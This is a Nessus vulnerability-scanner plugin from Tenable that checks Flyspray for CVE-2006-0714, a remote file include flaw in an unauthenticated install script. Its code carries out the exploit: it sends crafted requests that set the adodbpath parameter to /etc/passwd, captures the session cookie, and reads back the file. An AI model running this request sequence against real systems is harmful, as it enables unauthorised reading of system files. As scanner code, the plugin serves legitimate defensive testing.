#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP script that is affected by a
remote file include vulnerability. 

Description :

The remote host is running Flyspray, an open-source, web-based, bug
tracking system written in PHP. 

The installed version of Flyspray contains an installation script that
does not require authentication and that fails to sanitize user input
to the 'adodbpath' parameter before using it in a PHP 'include_once()'
function.  An unauthenticated attacker may be able to exploit this
issue to view arbitrary files on the remote host and to execute
arbitrary PHP code, possibly taken from third-party hosts. 

See also :

http://retrogod.altervista.org/egs_10rc4_php5_incl_xpl.html
http://www.securityfocus.com/archive/1/424902/30/0/threaded

Solution :

Remove the affected script. 

Risk factor : 

Low / CVSS Base Score : 2.3
(AV:R/AC:L/Au:NR/C:N/I:P/A:N/B:N)";


if (description) {
  script_id(20929);
  script_version("$Revision: 1.5 $");

  script_cve_id("CVE-2006-0714");
  script_bugtraq_id(16618);

  script_name(english:"Flyspray adodbpath Parameter Remote File Include Vulnerability");
  script_summary(english:"Checks for adodbpath parameter remote file include vulnerability in Flyspray");
 
  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = make_list("/flyspray", "/bugs", "/egs", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  foreach subdir (make_list("/sql", "/modules/projects/sql")) {
    url = string(dir, subdir, "/install-0.9.7.php");

    # Check whether the file exists.
    req = http_get(item:string(url, "?p=2"), port:port);
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    # If it does ...
    if (">Flyspray setup<" >< res) {
      # Try to exploit the flaw to read /etc/passwd.
      file = "/etc/passwd";

      # First set the session vars.
      #
      # nb: by leaving out some of the required vars, we avoid 
      #     updating the config file yet still create the session.
      postdata = string(
      "basedir=/&", 
      "adodbpath=", file
      );
      req = string(
        "POST ", url, "?p=3 HTTP/1.1\r\n",
        "Host: ", get_host_name(), "\r\n",
        "Content-Type: application/x-www-form-urlencoded\r\n",
        "Content-Length: ", strlen(postdata), "\r\n",
        "\r\n",
        postdata
      );
      res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
      if (res == NULL) exit(0);

      # If it looks like that worked...
      if ('.php?p=2">Go back and finish it' >< res) {
        # Grab the session cookie.
        pat = "Set-Cookie: PHPSESSID=(.+); path=";
        matches = egrep(string:res, pattern:pat);
        if (matches) {
          foreach match (split(matches)) {
            match = chomp(match);
            sid = eregmatch(pattern:pat, string:match);
            if (!isnull(sid)) {
              sid = sid[1];
              break;
            }
          }
        }

        # And finally, try to read the file.
        if (sid) {
          req = http_get(item:string(url, "?p=4"), port:port);
          req = str_replace(
            string:req,
            find:"User-Agent:",
            replace:string(
              "Cookie: PHPSESSID=", sid, "\r\n",
              "User-Agent:"
            )
          );
          res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
          if (res == NULL) exit(0);

          # There's a problem if it looks like the passwd file.
          if (egrep(pattern:"root:.*:0:[01]:", string:res)) {
            contents = strstr(res, "Setup</h3>");
            if (contents) contents = contents - "Setup</h3>";

            if (isnull(contents)) report = desc;
            else {
              report = string(
                desc,
                "\n\n",
                "Plugin output :\n",
                "\n",
                "Here are the contents of the file '", file, "' that Nessus\n",
                "was able to read from the remote host :\n",
                "\n",
                contents
              );
            }

            security_note(port:port, data:report);
            exit(0);
          }
        }
      }
    }
  }
}
